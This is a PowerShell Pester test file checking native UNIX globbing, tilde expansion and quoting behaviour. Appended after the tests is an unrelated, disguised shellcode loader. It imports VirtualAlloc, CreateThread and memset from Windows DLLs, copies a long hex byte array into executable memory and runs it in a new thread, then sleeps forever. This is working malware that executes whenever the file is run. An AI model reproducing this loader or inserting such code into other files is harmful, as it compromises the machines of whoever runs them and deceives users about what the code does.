Describe 'Native UNIX globbing tests' -tags "CI" {BeforeAll {if (-Not $IsWindows ){"" > "$TESTDRIVE/abc.txt""" > "$TESTDRIVE/bbb.txt""" > "$TESTDRIVE/cbb.txt"}$defaultParamValues = $PSDefaultParameterValues.Clone()$PSDefaultParameterValues["it:skip"] = $IsWindows}AfterAll {$global:PSDefaultParameterValues = $defaultParamValues}It 'The globbing pattern *.txt should match 3 files' {(/bin/ls $TESTDRIVE/*.txt).Length | Should -Be 3}It 'The globbing pattern *b.txt should match 2 files whose basenames end in "b"' {(/bin/ls $TESTDRIVE/*b.txt).Length | Should -Be 2}It 'The globbing pattern should match 2 files whose names start with either "a" or "b"' {(/bin/ls $TESTDRIVE/[ab]*.txt).Length | Should -Be 2}It 'Globbing abc.* should return one file name "abc.txt"' {/bin/ls $TESTDRIVE/abc.* | Should -Match "abc.txt"}It 'Globbing [cde]b?.* should return one file name "cbb.txt"' {/bin/ls $TESTDRIVE/[cde]b?.* | Should -Match "cbb.txt"}It 'Globbing should work with unquoted expressions' {$v = "$TESTDRIVE/abc*"/bin/ls $v | Should -Match "abc.txt"$h = [pscustomobject]@{P=$v}/bin/ls $h.P | Should -Match "abc.txt"$a = $v,$v/bin/ls $a[1] | Should -Match "abc.txt"}It 'Should not normalize absolute paths' {$matches = /bin/echo /etc/*$matches.substring(0,5) | Should Be '/etc/'}It 'Globbing should not happen with quoted expressions' {$v = "$TESTDRIVE/abc*"/bin/echo "$v" | Should -BeExactly $v/bin/echo '$v' | Should -BeExactly '$v'}It 'Should return the original pattern (<arg>) if there are no matches' -TestCases @(@{arg = '/nOSuCH*file'},               @{arg = '/bin/nOSuCHdir/*'},           @{arg = '-NosUch*fIle'},               @{arg = '-nOsuCh*drive:nosUch*fIle'},  @{arg = '-nOs[u]ChdrIve:nosUch*fIle'}, @{arg = '-nOsuChdRive:nosUch*fIle'},   @{arg = '-nOsuChdRive: nosUch*fIle'},  @{arg = '/no[suchFilE'},               @{arg = '[]'}                          ) {param($arg)/bin/echo $arg | Should -BeExactly $arg}$quoteTests = @(@{arg = '"*"'},@{arg = "'*'"})It 'Should not expand quoted strings: <arg>' -TestCases $quoteTests {param($arg)Invoke-Expression "/bin/echo $arg" | Should -BeExactly '*'}It 'Should not expand quoted strings via splat array: <arg>' -TestCases $quoteTests -Skip {param($arg)function Invoke-Echo{/bin/echo @args}Invoke-Expression "Invoke-Echo $arg" | Should -BeExactly '*'}It 'Should not expand quoted strings via splat hash: <arg>' -TestCases $quoteTests -Skip {param($arg)function Invoke-Echo($quotedArg){/bin/echo @PSBoundParameters}Invoke-Expression "Invoke-Echo -quotedArg:$arg" | Should -BeExactly "-quotedArg:*"Invoke-Expression "Invoke-Echo -quotedArg: $arg" | Should -BeExactly "-quotedArg:*"}It 'Should not expand patterns on non-filesystem drives' {/bin/echo env:ps* | Should -BeExactly "env:ps*"}It 'Globbing filenames with spaces should match 2 files' {"" > "$TESTDRIVE/foo bar.txt""" > "$TESTDRIVE/foo baz.txt"(/bin/ls $TESTDRIVE/foo*.txt).Length | Should -Be 2}It 'Tilde should be replaced by the filesystem provider home directory' {/bin/echo ~ | Should -BeExactly ($executioncontext.SessionState.Provider.Get("FileSystem").Home)}It '~/foo should be replaced by the <filesystem provider home directory>/foo' {/bin/echo ~/foo | Should -BeExactly "$($executioncontext.SessionState.Provider.Get("FileSystem").Home)/foo"}It '~ should not be replaced when quoted' {/bin/echo '~' | Should -BeExactly '~'/bin/echo "~" | Should -BeExactly '~'/bin/echo '~/foo' | Should -BeExactly '~/foo'/bin/echo "~/foo" | Should -BeExactly '~/foo'}}$ZAl5 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ZAl5 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xce,0xd9,0x74,0x24,0xf4,0x5e,0xbd,0xca,0x8a,0x52,0x62,0x33,0xc9,0xb1,0x58,0x31,0x6e,0x1a,0x83,0xee,0xfc,0x03,0x6e,0x16,0xe2,0x3f,0x76,0xba,0xe0,0xbf,0x87,0x3b,0x85,0x36,0x62,0x0a,0x85,0x2c,0xe6,0x3d,0x35,0x27,0xaa,0xb1,0xbe,0x65,0x5f,0x41,0xb2,0xa1,0x50,0xe2,0x79,0x97,0x5f,0xf3,0xd2,0xeb,0xfe,0x77,0x29,0x3f,0x21,0x49,0xe2,0x32,0x20,0x8e,0x1f,0xbe,0x70,0x47,0x6b,0x6c,0x65,0xec,0x21,0xac,0x0e,0xbe,0xa4,0xb4,0xf3,0x77,0xc6,0x95,0xa5,0x0c,0x91,0x35,0x47,0xc0,0xa9,0x7c,0x5f,0x05,0x97,0x37,0xd4,0xfd,0x63,0xc6,0x3c,0xcc,0x8c,0x64,0x01,0xe0,0x7e,0x75,0x45,0xc7,0x60,0x00,0xbf,0x3b,0x1c,0x12,0x04,0x41,0xfa,0x97,0x9f,0xe1,0x89,0x0f,0x44,0x13,0x5d,0xc9,0x0f,0x1f,0x2a,0x9e,0x48,0x3c,0xad,0x73,0xe3,0x38,0x26,0x72,0x24,0xc9,0x7c,0x50,0xe0,0x91,0x27,0xf9,0xb1,0x7f,0x89,0x06,0xa1,0xdf,0x76,0xa2,0xa9,0xf2,0x63,0xdf,0xf3,0x9a,0x1d,0xba,0x7f,0x5b,0x8a,0x33,0xe9,0x35,0x23,0xef,0x81,0x85,0xc4,0x29,0x55,0xe9,0xfe,0x04,0x82,0x46,0x52,0x35,0x67,0x3a,0x3c,0x83,0xd1,0xc5,0x1b,0x0c,0x08,0x66,0x37,0x98,0xb0,0xda,0xe4,0x34,0x14,0xd3,0x0a,0xc4,0xb2,0x60,0x0a,0xc4,0x42,0x56,0x4f,0x83,0x0a,0x91,0x1f,0x0b,0xdb,0x89,0xc8,0x82,0x44,0x8f,0x08,0x41,0xf3,0xd6,0xa4,0x01,0x04,0xe5,0xaa,0x55,0x57,0x5a,0x78,0x02,0x0b,0x0a,0x16,0x47,0xfe,0x9c,0xdd,0x68,0xd4,0x77,0x4b,0x9c,0x88,0x1f,0x0c,0x93,0x36,0xe0,0x85,0x33,0x5c,0xe4,0xc5,0xd9,0xbe,0xb2,0x8d,0x68,0x87,0xa4,0xc8,0x6d,0xd2,0x8a,0x87,0xc2,0x8e,0x7a,0x40,0xc9,0x36,0x9b,0xeb,0xee,0xe2,0x1e,0xcb,0x65,0x07,0x6e,0xb9,0x5c,0x7f,0x80,0xf4,0xfc,0xd6,0x9f,0x22,0x6a,0x97,0x37,0xcd,0x7a,0x17,0xc8,0xa5,0x7a,0x17,0x88,0x35,0x29,0x7f,0x50,0x92,0x9e,0x9a,0x9f,0x0f,0xb3,0x36,0x33,0x39,0x54,0xef,0xdb,0x39,0xba,0x10,0x1c,0x69,0xec,0x78,0x0e,0x1b,0x99,0x9b,0xd1,0xf6,0x1c,0x9b,0x5a,0x34,0x95,0x1b,0xa2,0x05,0x2c,0xe3,0xd1,0x6c,0x76,0x27,0x46,0x87,0xf3,0x58,0x86,0xa8,0x8c,0xd1,0x0e,0x64,0x5c,0x7d,0x99,0xf8,0xcf,0xec,0x3c,0xd0,0x7a,0x9f,0x90,0x4e,0xe5,0x2b,0x88,0x8e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$bVz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($bVz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$bVz,0,0,0);for (;;){Start-sleep 60};